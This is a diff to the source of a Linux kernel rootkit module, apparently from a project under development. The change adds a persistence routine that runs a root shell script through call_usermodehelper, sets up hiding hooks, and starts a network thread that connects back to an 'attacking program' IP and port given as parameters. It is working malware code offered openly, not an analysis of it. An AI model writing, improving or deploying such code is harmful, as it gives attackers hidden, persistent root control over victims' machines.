@@ -9,15 +9,52 @@ static int port = 6667;
 static struct task_struct *thread = NULL;
 
 module_param(ip, charp, 0660);
-/* module_param(ip, charp, S_IRUSR | S_IWUSR | S_IRGRP | S_IWGRP | S_IROTH |
- * S_IWOTH); */
 module_param(port, int, 0660);
 MODULE_PARM_DESC(ip, "IP address of the attacking program");
 MODULE_PARM_DESC(port, "Port number of the attacking program");
 
-static __init int rootkit_init(void)
+// setup persistence by running shell script as root
+static int persist(void) 
 {
-    struct config *cfg = kmalloc(sizeof(struct config), GFP_KERNEL);
+    struct subprocess_info *sub_info = NULL;
+    char *envp[] = { "PATH=/sbin:/bin:/usr/sbin:/usr/bin", NULL };
+    char *argv[] = { "/bin/sh", "-c", "/rootkit/persist/persist.sh >/rootkit/persist/log 2>&1", NULL };
+    int status = 0;
+
+    sub_info = call_usermodehelper_setup(argv[0], argv, envp, GFP_KERNEL, NULL,
+                                         NULL, NULL);
+    if (sub_info == NULL)
+    {
+        pr_err("exec: failed to setup usermodehelper\n");
+        return 1;
+    }
+
+    status = call_usermodehelper_exec(sub_info, UMH_WAIT_PROC);
+    status = status >> 8;
+    pr_info("persist: done. status: %d", status);
+
+    return status;
+}
+
+static __init int rootkit_init(void)
+{ 
+    struct config *cfg = NULL;
+
+    pr_info("rootkit: inserted.\n");
+
+    // Persist
+    pr_info("rootkit: setting persistence up...\n");
+    if (persist() != 0) {
+        pr_err("rootkit: couldn't setup persistence. exiting\n"); 
+        return 0;
+    }
+
+    // Hide
+    pr_info("rootkit: setting hooks up...\n");
+    setup_hooks();
+
+    // Network loop on separate thread
+    cfg = kmalloc(sizeof(struct config), GFP_KERNEL);
     if (!cfg)
     {
         pr_err("rootkit: kmalloc for config struct failed. exiting.\n");
@@ -25,20 +62,16 @@ static __init int rootkit_init(void)
     }
     cfg->ip = ip;
     cfg->port = port;
-    pr_info("rootkit: inserted.\n");
-    pr_info("rootkit: setting hooks up...\n");
-    setup_hooks();
-
     thread = kthread_run(network_loop, cfg, "loop_thread");
     if (IS_ERR(thread))
     {
         pr_err("rootkit: thread failed to start\n");
-        /* thread = NULL; */
+        kfree(cfg);
         return PTR_ERR(thread);
     }
-
-    // TODO: if thread exits because connection lost, start over.
     pr_info("rootkit: started network loop thread.\n");
+
+    // cfg freed by network thread on exit
     return 0;
 }
 
@@ -47,7 +80,6 @@ static __exit void rootkit_exit(void)
     pr_info("rootkit: rmmoding...\n");
     if (thread)
     {
-        // TODO: find some way to stop thread even if it's stopped at a recv.
         pr_info("rootkit: stopping network thread.\n");
         kthread_stop(thread);
     }
